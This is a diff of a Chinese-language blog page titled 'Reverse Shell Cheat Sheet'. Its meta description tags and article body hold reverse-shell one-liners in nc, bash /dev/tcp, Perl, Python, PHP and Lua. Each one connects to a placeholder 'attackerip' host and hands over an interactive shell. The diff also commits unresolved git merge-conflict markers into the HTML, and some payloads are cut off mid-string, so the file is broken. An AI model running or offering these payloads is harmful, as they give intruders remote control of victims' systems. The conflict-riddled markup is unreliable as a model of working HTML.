@@ -34,7 +34,20 @@
 <meta name="keywords" content="Shell, CheatSheet" />
 
 <meta property="og:title" content="Reverse Shell Cheat Sheet" />
+<<<<<<< HEAD
 <meta property="og:description" content="利用 nc 监听端口 nc -lvp 2333 nc 版本： nc -e /bin/sh attackerip 2333 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 2333 &gt;/tmp/f nc attackerip 8888|/bin/sh|nc attackerip 9999 Bash 版本： bash -i &gt;&amp; /dev/tcp/attackerip/2333 0&gt;&amp;1 bash -i &gt;&amp; /dev/tcp/attackerip/2333 &lt;&amp;2 exec 5&lt;&gt;/dev/tcp/attackerip/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 mknod backpipe p; nc attackerip 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe Perl 版本: perl -e &#39;use Socket;$i=&quot;attackerip&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39; Python 版本： python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39; php 版本： php -r &#39;$sock=fsockopen(&quot;attackerip&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3" />
+=======
+<meta property="og:description" content="利用 nc 监听端口
+nc -lvp 2333
+
+nc 版本：
+nc -e /bin/sh attackerip 2333
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 2333 &gt;/tmp/f
+
+nc attackerip 8888|/bin/sh|nc attackerip 9999
+" />
+>>>>>>> f00a4d10143bda514c4168bf395f69705a632acc
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://hare001.github.io/2020/reverse-shell-cheat-sheet/" />
 <meta property="og:image" content="https://hare001.github.io/img/og.png"/>
@@ -45,7 +58,20 @@
 <meta name="twitter:image" content="https://hare001.github.io/img/og.png"/>
 
 <meta name="twitter:title" content="Reverse Shell Cheat Sheet"/>
+<<<<<<< HEAD
 <meta name="twitter:description" content="利用 nc 监听端口 nc -lvp 2333 nc 版本： nc -e /bin/sh attackerip 2333 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 2333 &gt;/tmp/f nc attackerip 8888|/bin/sh|nc attackerip 9999 Bash 版本： bash -i &gt;&amp; /dev/tcp/attackerip/2333 0&gt;&amp;1 bash -i &gt;&amp; /dev/tcp/attackerip/2333 &lt;&amp;2 exec 5&lt;&gt;/dev/tcp/attackerip/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 mknod backpipe p; nc attackerip 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe Perl 版本: perl -e &#39;use Socket;$i=&quot;attackerip&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39; Python 版本： python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39; php 版本： php -r &#39;$sock=fsockopen(&quot;attackerip&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3"/>
+=======
+<meta name="twitter:description" content="利用 nc 监听端口
+nc -lvp 2333
+
+nc 版本：
+nc -e /bin/sh attackerip 2333
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 2333 &gt;/tmp/f
+
+nc attackerip 8888|/bin/sh|nc attackerip 9999
+"/>
+>>>>>>> f00a4d10143bda514c4168bf395f69705a632acc
 
 
 
@@ -167,7 +193,10 @@ p.waitFor()
 <h2 id="lua-版本">Lua 版本：</h2>
 <pre><code class="language-bash">lua -e &quot;require('socket');require('os');t=socket.tcp();t:connect('attackerip','2333');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');&quot;
 </code></pre>
+<<<<<<< HEAD
 
+=======
+>>>>>>> f00a4d10143bda514c4168bf395f69705a632acc
     </div>
 </article>
 
